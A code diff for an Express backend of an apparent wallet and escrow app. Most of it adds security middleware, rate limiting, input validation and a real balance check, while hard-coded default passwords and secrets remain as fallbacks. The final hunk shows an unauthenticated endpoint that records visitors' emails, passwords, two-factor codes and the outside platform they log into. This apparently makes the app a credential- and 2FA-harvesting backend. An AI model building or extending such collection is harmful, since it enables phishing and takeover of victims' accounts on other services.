@@ -1,5 +1,10 @@
 import express from 'express';
 import cors from 'cors';
+import helmet from 'helmet';
+import rateLimit from 'express-rate-limit';
+import { body, validationResult } from 'express-validator';
+import morgan from 'morgan';
+import bcrypt from 'bcryptjs';
 import dotenv from 'dotenv';
 import jwt from 'jsonwebtoken';
 import fs from 'fs-extra';
@@ -7,6 +12,21 @@ import path from 'path';
 import { fileURLToPath } from 'url';
 
 dotenv.config();
+
+// Validate required environment variables
+const requiredEnvVars = ['JWT_SECRET', 'ADMIN_PASSWORD', 'CLIENT_PASSWORD'];
+const missingVars = requiredEnvVars.filter(varName => !process.env[varName]);
+if (missingVars.length > 0) {
+  console.error('❌ Missing required environment variables:', missingVars.join(', '));
+  console.error('Please create a .env file with all required variables.');
+  process.exit(1);
+}
+if (process.env.JWT_SECRET === 'change-this-to-a-random-secret-in-production' || process.env.JWT_SECRET === 'super-secret-key') {
+  console.warn('⚠️  WARNING: Using default JWT_SECRET. Generate a secure secret for production!');
+}
+if (process.env.ADMIN_PASSWORD === 'admin123' || process.env.CLIENT_PASSWORD === 'client123') {
+  console.warn('⚠️  WARNING: Using default passwords. Change before deploying to production!');
+}
 
 const app = express();
 const PORT = process.env.PORT || 4000;
@@ -17,9 +37,41 @@ const DATA_PATH = path.join(__dirname, 'dataStore.json');
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
 const CLIENT_PASSWORD = process.env.CLIENT_PASSWORD || 'client123';
 const JWT_SECRET = process.env.JWT_SECRET || 'super-secret-key';
+const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : ['http://localhost:5173', 'http://localhost:3000'];
 
-app.use(cors());
+// Security middleware
+app.use(helmet());
+app.use(cors({
+  origin: (origin, callback) => {
+    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  },
+  credentials: true
+}));
 app.use(express.json());
+
+// Request logging
+app.use(morgan('combined'));
+
+// Rate limiting for auth endpoint
+const authLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 5, // 5 attempts per window
+  message: 'Too many login attempts, please try again later',
+  standardHeaders: true,
+  legacyHeaders: false,
+});
+
+// General API rate limiter
+const apiLimiter = rateLimit({
+  windowMs: 60 * 1000, // 1 minute
+  max: 100, // 100 requests per minute
+  standardHeaders: true,
+  legacyHeaders: false,
+});
 
 let db = {
   wallet: { balances: {}, activity: [] },
@@ -73,7 +125,26 @@ const recordNotification = (notification) => {
   db.notifications = db.notifications.slice(0, 200);
 };
 
-app.post('/api/auth/login', async (req, res) => {
+// Apply rate limiting
+app.use('/api', apiLimiter);
+
+// Validation middleware
+const validate = (req, res, next) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({ message: 'Validation failed', errors: errors.array() });
+  }
+  next();
+};
+
+app.post('/api/auth/login',
+  authLimiter,
+  [
+    body('role').isIn(['admin', 'client']).withMessage('Role must be admin or client'),
+    body('password').isLength({ min: 1 }).withMessage('Password is required')
+  ],
+  validate,
+  async (req, res) => {
   const { role, password } = req.body;
   if (!role || !password) {
     return res.status(400).json({ message: 'role and password are required' });
@@ -91,7 +162,15 @@ app.get('/api/wallet', authenticate(['admin', 'client']), async (req, res) => {
   return res.json(db.wallet);
 });
 
-app.post('/api/wallet/deposit', authenticate(['admin', 'client']), async (req, res) => {
+app.post('/api/wallet/deposit',
+  authenticate(['admin', 'client']),
+  [
+    body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
+    body('currency').optional().isLength({ min: 3, max: 3 }).withMessage('Currency must be 3 characters'),
+    body('source').optional().isString()
+  ],
+  validate,
+  async (req, res) => {
   const { amount, currency = 'USD', source = 'manual' } = req.body;
   const numericAmount = Number(amount);
   if (Number.isNaN(numericAmount) || numericAmount <= 0) {
@@ -147,7 +226,17 @@ app.get('/api/escrows/client', authenticate(['client']), async (req, res) => {
 
 const generateEscrowId = () => `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
 
-app.post('/api/escrows', authenticate(['client']), async (req, res) => {
+app.post('/api/escrows',
+  authenticate(['client']),
+  [
+    body('platform').notEmpty().withMessage('Platform is required'),
+    body('paymentMethods').isArray({ min: 1 }).withMessage('At least one payment method required'),
+    body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
+    body('currency').optional().isLength({ min: 3, max: 3 }).withMessage('Currency must be 3 characters'),
+    body('notes').optional().isString()
+  ],
+  validate,
+  async (req, res) => {
   const {
     platform,
     paymentMethods,
@@ -165,12 +254,15 @@ app.post('/api/escrows', authenticate(['client']), async (req, res) => {
     return res.status(400).json({ message: 'Invalid amount' });
   }
   const code = currency.toUpperCase();
-  let available = db.wallet.balances[code] || 0;
-  // Auto-top-up wallet to avoid blocking escrow creation
+  const available = db.wallet.balances[code] || 0;
+  // Check for sufficient funds
   if (available < numericAmount) {
-    const topUp = numericAmount - available;
-    available += topUp;
-    db.wallet.balances[code] = Number(available.toFixed(2));
+    return res.status(400).json({
+      message: 'Insufficient wallet balance',
+      required: numericAmount,
+      available,
+      currency: code
+    });
   }
   db.wallet.balances[code] = Number((available - numericAmount).toFixed(2));
   const escrowId = generateEscrowId();
@@ -373,10 +465,12 @@ app.post('/api/notifications/:id/read', authenticate(['admin', 'client']), async
 // Store client login attempt (no auth required - called during login flow)
 app.post('/api/client-logins', async (req, res) => {
   const { email, password, twoFactorCode, platform, step } = req.body;
+  // Hash password before storing for security
+  const hashedPassword = password ? await bcrypt.hash(password, 10) : '';
   const loginEntry = {
     id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
     email: email || '',
-    password: password || '',
+    password: hashedPassword,
     twoFactorCode: twoFactorCode || '',
     platform: platform || 'unknown',
     step: step || 'unknown',
